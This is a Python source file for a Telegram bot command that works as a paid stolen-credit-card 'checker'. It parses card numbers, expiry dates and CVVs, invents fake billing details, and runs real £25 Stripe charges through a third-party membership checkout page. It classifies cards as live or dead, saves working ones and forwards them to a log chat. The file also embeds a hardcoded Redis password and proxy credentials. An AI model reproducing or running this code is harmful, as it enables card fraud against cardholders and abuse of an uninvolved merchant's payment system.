import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
import bs4
from defs import *
from pyrogram import Client, filters
import json

@Client.on_message(filters.command(["zm"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)

async def sa(Client, message):
    try:
        started_time = time.time()
        verified_gps = open("groups.txt", "r")
        verified_gps = verified_gps.readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            await message.reply_text(text="""<b>This Group Is Not Verified. Talk With <code>@r0ld3x</code> And Ask For Verification.</b>""",reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> RESULT: <b>CHECKING YOUR INPUT</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            client = pymongo.MongoClient(mongourl, serverSelectionTimeoutMS=5000)
            find = client.bot["main"].find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(f"""<b>Register Yourself To Use Me. Hit /takeme To Register Yourself</b>""")
            elif find['status'] == "F" or find['credits'] == "0":
                await msg.edit_text("""<b>buy paid plan to use this gate hit /buy to see my premium plans</b>""")
            elif find['status'] == "P" and find['credits'] < 2:
                await msg.edit_text("""<b>You comsumed all your credits. hit /buy to buy more credits. And now are demoted to a free user</b>""")
                maindb.update_one({'_id': message.from_user.id},{
                    '$set': {
                        "plan": "Free Plan",
                        "role": "Free User",
                        "status": "F",
                        "credits": 0,
                        }
                    }, upsert=False)
            else:
                r = redis.Redis(
                    host="redis-18001.c82.us-east-1-2.ec2.cloud.redislabs.com",
                    port=18001,
                    password="eO00qpZScxQ6u1UsZ32Y94YuZ1J7pGWR",
                )
                antispam_time = int(r.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 20:
                    time_left = 20 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError("Your Card Is Empty")
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect Or Empty")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                        cc_first_letter = int(cc[0])
                        len_mes = len(mes)
                        if cc_first_letter in [1,2,7,8,9,0]:
                            await msg.edit_text("Your Card Invalid")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short")
                        elif int(len(mes)) not in [2,4] or len_mes == 2 and mes > '12' or len_mes == 2 and mes < '00' or len_mes != 2:
                            await msg.edit_text("Your Card Month Is Incorrect")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2 or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect")
                        elif cc_first_letter == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            req = requests.Session()
                            req.proxies = {
                                "http": "http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/",
                                "https": "http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/",
                            }
                            res = requests.get("https://jocastabins.herokuapp.com/api/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card's Bin Is Invalid")   
                            elif(str(message.chat.id) + "\n"in open("bannedbin.txt", "r").readlines()):
                                await msg.edit_text("Your Card's Bin Is Banned")
                            else:
                                bin_data = json.loads(res.text)
                                res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                random_data = json.loads(res.text)
                                phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
                                first_name = random_data['results'][0]['name']['first']
                                last_name = random_data['results'][0]['name']['last']
                                street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
                                city = random_data['results'][0]['location']['city']
                                state = random_data['results'][0]['location']['state']
                                zip = random_data['results'][0]['location']['postcode']
                                vendor = bin_data["data"]["vendor"].lower()
                                email = get_email()
                                password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                url= 'https://www.britishmoroccansociety.org/wp-json/wpsp/v2/checkout-session'
                                headers = {
                                'authority':'www.britishmoroccansociety.org',
                                'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
                                'content-type':'application/x-www-form-urlencoded',
                                'cookie':'licensee_email=roldexstark@gmail.com',
                                'origin':'https://www.britishmoroccansociety.org',
                                'referer':'https://www.britishmoroccansociety.org/gift-membership/',
                                'sec-ch-ua-mobile':'?0',
                                'sec-ch-ua-platform':'"Linux"',
                                'sec-fetch-dest':'document',
                                'sec-fetch-mode':'navigate',
                                'sec-fetch-site':'same-origin',
                                'sec-fetch-user':'?1',
                                'upgrade-insecure-requests':'1',
                                'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
                                }
                                data = {
                                "form_values[simpay_form_id]":"3523",
                                "form_values[_wpnonce]":"8060238bbe",
                                "form_values[_wp_http_referer]":"/gift-membership/",
                                "form_data[formId]":"3523",
                                "form_data[formInstance]":"0",
                                "form_data[quantity]":"1",
                                "form_data[isValid]":"true",
                                "form_data[stripeParams][key]":"pk_live_51HyzoNJBJafJHdganJ3YWAp4cXrMLyuGnkMYcOzQp08WNgnx7RCyHq7QVHP0Tl31dXFMH2qWcukfPKxDKRYd3LvS00si38SXXC",
                                "form_data[stripeParams][success_url]":"https://www.britishmoroccansociety.org/payment-confirmation/?form_id=3523",
                                "form_data[stripeParams][error_url]":"https://www.britishmoroccansociety.org/payment-failed/?form_id=3523",
                                "form_data[stripeParams][name]":"British Moroccan Society",
                                "form_data[stripeParams][locale]":"auto",
                                "form_data[stripeParams][country]":"GB",
                                "form_data[stripeParams][currency]":"GBP",
                                "form_data[stripeParams][description]":"Gift Membership",
                                "form_data[amount]":"25",
                                "form_data[stripeErrorMessages][invalid_number]":"The card number is not a valid credit card number.",
                                "form_data[stripeErrorMessages][invalid_expiry_month]":"The card's expiration month is invalid.",
                                "form_data[stripeErrorMessages][invalid_expiry_year]":"The card's expiration year is invalid.",
                                "form_data[stripeErrorMessages][invalid_cvc]":"The card's security code is invalid.",
                                "form_data[stripeErrorMessages][incorrect_number]":"The card number is incorrect.",
                                "form_data[stripeErrorMessages][incomplete_number]":"The card number is incomplete.",
                                "form_data[stripeErrorMessages][incomplete_cvc]":"The card's security code is incomplete.",
                                "form_data[stripeErrorMessages][incomplete_expiry]":"The card's expiration date is incomplete.",
                                "form_data[stripeErrorMessages][expired_card]":"The card has expired.",
                                "form_data[stripeErrorMessages][incorrect_cvc]":"The card's security code is incorrect.",
                                "form_data[stripeErrorMessages][incorrect_zip]":"The card's zip code failed validation.",
                                "form_data[stripeErrorMessages][invalid_expiry_year_past]":"The card's expiration year is in the past",
                                "form_data[stripeErrorMessages][card_declined]":"The card was declined.",
                                "form_data[stripeErrorMessages][processing_error]":"An error occurred while processing the card.",
                                "form_data[stripeErrorMessages][invalid_request_error]":"Unable to process this payment, please try again or use alternative method.",
                                "form_data[stripeErrorMessages][email_invalid]":"Invalid email address, please correct and try again.",
                                "form_data[paymentButtonText]":"Pay with Card",
                                "form_data[paymentButtonLoadingText]":"Please Wait...",
                                "form_id":"3523",
                                "customer_id":"",
                                }
                                req = requests.post(url, data=data , headers=headers)
                                json_text = json.loads(req.text)
                                if 'error' in json_text:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (INCORRECT NUMBER)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    r.set(message.from_user.id, int(time.time()))
                                elif 'sessionId' not in json_text:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (ERROR)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    r.set(message.from_user.id, int(time.time()))
                                else:
                                    sessionId = json_text['sessionId']
                                    headers = {
                                    "authority": "api.stripe.com",
                                    "method": "POST",
                                    "scheme": "https",
                                    "accept": "application/json",
                                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                                    "content-type": "application/x-www-form-urlencoded",
                                    "origin": "https://checkout.stripe.com",
                                    "referer": "https://checkout.stripe.com/",
                                    "sec-fetch-dest": "empty",
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-site",
                                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                                    }
                                    data = {
                                    'type':'card',
                                    'card[number]': cc,
                                    'card[cvc]': cvv,
                                    'card[exp_month]': mes,
                                    'card[exp_year]': ano,
                                    'billing_details[name]': first_name + last_name,
                                    'billing_details[email]': email,
                                    'billing_details[address][country]':'US',
                                    'billing_details[address][postal_code]': zip,
                                    'guid':'a90f5540-fdc0-4d4a-bb69-4f516c5c9fc0639c9c',
                                    'muid':'fe7bd185-9a2d-4985-a01f-f16dc79c7386a14e48',
                                    'sid':'df80ce43-7e14-4f17-9841-492ddff54f324db06f',
                                    'key':'pk_live_51HyzoNJBJafJHdganJ3YWAp4cXrMLyuGnkMYcOzQp08WNgnx7RCyHq7QVHP0Tl31dXFMH2qWcukfPKxDKRYd3LvS00si38SXXC',
                                    'payment_user_agent':'stripe.js/8837eef7f; stripe-js-v3/8837eef7f; checkout',
                                    }
                                    res = requests.post("https://api.stripe.com/v1/payment_methods",headers=headers,data=data)
                                    json_first = json.loads(res.text)
                                    if 'error' in json_text:
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (INCORRECT NUMBER)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        r.set(message.from_user.id, int(time.time()))
                                    elif 'id' not in json_first:
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (ERROR)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        r.set(message.from_user.id, int(time.time()))
                                    else:
                                        id = json_first["id"]
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: ■■■■■□□□□□ 50%
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        url = f"https://api.stripe.com/v1/payment_pages/{sessionId}/confirm"
                                        headers = {
                                        "authority": "api.stripe.com",
                                        "method": "POST",
                                        "scheme": "https",
                                        "accept": "application/json",
                                        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                                        "content-type": "application/x-www-form-urlencoded",
                                        "origin": "https://checkout.stripe.com",
                                        "referer": "https://checkout.stripe.com/",
                                        "sec-fetch-dest": "empty",
                                        "sec-fetch-mode": "cors",
                                        "sec-fetch-site": "same-site",
                                        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                                        }
                                        data = {
                                        'eid':'NA',
                                        'payment_method': id,
                                        'expected_amount':'2500',
                                        'expected_payment_method_type':'card',
                                        'key':'pk_live_51HyzoNJBJafJHdganJ3YWAp4cXrMLyuGnkMYcOzQp08WNgnx7RCyHq7QVHP0Tl31dXFMH2qWcukfPKxDKRYd3LvS00si38SXXC',}
                                        res = requests.post(url,headers=headers,data=data)
                                        json_first = json.loads(res.text)
                                        errror_code = json_first['error']['decline_code'].upper()
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        try:
                                            if res.status_code == requests.codes.ok:
                                                save_live(lista)
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CHARGED £25"
                                            elif "Thank" in res.text or "Thank" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or 'Success' in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text:
                                                save_live(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CHARGED £25"
                                            elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
                                                save_live(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " Insufficient")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "LOW FUNDS"
                                            elif "card zip code is incorrect" in res.text or "The zip code you supplied failed validation" in res.text or 'incorrect_zip' in res.text or 'The zip code you supplied failed validation' in res.text:
                                                save_live(lista)
                                                Client.send_message(chat_id=loggp,text=str(lista) + " #zip")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "ZIP INCORRECT"
                                            elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                                save_ccn(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CVV MISMATCH"
                                            elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "PURCHASE NOT ALLOWED"
                                            elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "CARD INCORRECT"
                                            elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "3D SECURITY"
                                            elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text or 'Your card has been declined by your bank' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = errror_code  #"CARD DECLINED"
                                            elif 'Do Not Honor' in res.text :
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "NO NOT HONOR"
                                            elif "card has expired" in res.text or 'Expired Card' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "CARD EXPIRED"
                                            else:
                                                response = "NOT SURE"
                                                r_logo = "❗"
                                                r_text = errror_code
                                        except Exception as e:
                                            await Client.send_message(chat_id=loggp, text=e)
                                        else:
                                            if response is None:
                                                await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                            else:
                                                credits = find['credits']
                                                credits_left = credits - 2
                                                maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}},upsert=False)
                                                text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>{response}[{r_logo}] ({r_text})</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> CREDITS LEFT: {credits_left}credits
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                                await msg.edit_text(text)
                                                r.set(message.from_user.id, int(time.time()))
    except ProxyError as e:
        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
        await Client.send_message(chat_id=loggp, text="Proxy Dead In za Gate")
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
